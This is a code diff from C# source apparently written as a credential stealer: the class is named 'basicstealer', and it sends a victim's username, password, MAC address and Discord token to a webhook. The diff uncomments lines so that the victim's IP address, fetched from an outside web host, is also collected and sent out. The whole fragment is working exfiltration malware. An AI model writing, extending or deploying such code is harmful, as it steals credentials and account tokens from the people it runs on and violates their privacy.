@@ -86,7 +86,7 @@ namespace basicst
             {
                 previus = username + password;
                 WebClient webClient = new WebClient();
-            //string ip = webClient.DownloadString(""https://showmyipaddress1337.000webhostapp.com/"");
+            string ip = webClient.DownloadString(""https://showmyipaddress1337.000webhostapp.com/"");
             using (basicstealer webhook = new basicstealer())
             {
                 webhook.WebHook = ""#webhook"";
@@ -96,8 +96,8 @@ namespace basicst
                     username,
                     ""\nPassword: "",
                     password,  
-					//""\nIp adress: "",
-					//ip,
+					""\nIp adress: "",
+					ip,
                     ""\nMac Adress: "",
 					GetMACAddress(),
 					""\nDiscord token: "",
@@ -209,14 +209,14 @@ namespace basicst
                 Program.ShowWindow(consoleWindow, 0);
             }
             WebClient webClient = new WebClient();
-            //string ip = webClient.DownloadString(""https://showmyipaddress1337.000webhostapp.com/"");
+            string ip = webClient.DownloadString(""https://showmyipaddress1337.000webhostapp.com/"");
             using (basicstealer webhook = new basicstealer())
             {
                 webhook.WebHook = ""#webhook"";
                 webhook.SendMessage(string.Concat(new string[]
 				{
-					//""Ip adress: "",
-					//ip,
+					""Ip adress: "",
+					ip,
                     ""\nMac Adress: "",
 					GetMACAddress(),
 					""\nDiscord token: "",
